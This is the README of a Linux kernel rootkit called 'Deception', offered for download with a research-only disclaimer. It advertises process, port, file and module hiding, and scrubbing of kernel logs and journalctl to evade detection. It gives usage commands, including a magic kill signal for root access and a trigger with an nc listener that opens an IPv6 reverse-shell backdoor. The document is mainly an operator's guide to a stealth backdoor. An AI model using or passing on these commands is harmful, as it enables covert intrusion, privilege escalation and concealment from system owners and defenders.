<img width="1024" height="620" alt="Deception (6)" src="https://repository-images.githubusercontent.com/1449993335/a542b6bd-8208-44d5-822a-38612251465a" /><br>

<b>Notice!</b> This software is provided solely for the purpose of research and is <b>not</b> intended to be used illegally or unethically. By cloning this repository or copying the source code herein, you are agreeing that you will <b>only</b> use this on your own machines for the purpose of research or on any other machine that you have permission to install it on. Use of this rootkit on systems which you do not have authorized access to violates title 18 U.S.C. section 1030. Also known as the <a href="https://www.justice.gov/jm/jm-9-48000-computer-fraud">computer fraud and abuse act</a>.<br>

### Features included with deception<br>
<b>* Process Hiding:</b> Hide multiple processes. You can unhide them one at a time or all at once.<br>
<b>* Port Hiding:</b> Hide multiple ports using a kill signal. Unhide them one at a time or all at once.<br>
<b>* Module Hiding:</b> Removes module from /proc/modules as well as /sys/module.<br>
<b>* File/Directory Hiding:</b> Any file or directory starting with secret_ will be hidden.<br>
<b>* Privilege Escalation:</b> The correct kill signal and magic number gives root privileges.<br>
<b>* Reverse Shell Backdoor:</b> Stealthy IPv6 implementation of <a href="https://github.com/raj3shp/bpfdoorpoc">bpfdoorpoc</a> by raj3shp.
### Additional stealth features
<b>* Filters Kernel Logs:</b> No tainted/out-of-tree/unsigned entries in dmesg or /dev/kmsg.<br>
<b>* Filters Kernel Tracing Files:</b> Any entries showing deception are filtered.<br>
<b>* Filters journalctl:</b> Deception does not show up anywhere in journalctl.<br>
<b>* Sets tainted_mask to 0:</b> in /proc/sys/kernel/tainted. Indicates that the kernel has not been tainted<br><br>

### Deception rootkit usage<br>
<b>* Hide Ports:</b> kill -61 [port] toggles visibility. kill -61 0 unhides all ports.<br>
<b>* Hide Processes:</b> kill -62 [pid] toggles visibility. kill -62 0 unhides all processes<br>
<b>* Gain Root:</b> Kill -64 31337. Magic number is configurable in source code.<br>
<b>* Reverse Shell:</b> ./trigger [ remote addr ] [ local addr ] + local listener (nc -6 -lvnp 65000)

Module starts out hidden from both procfs and sysfs. It can't be uninstalled. You must reboot.<br><br>

You might also enjoy reading <a href="https://carls0n.github.io">defeating LKM and LD_PRELOAD rootkits for fun and profit</a>
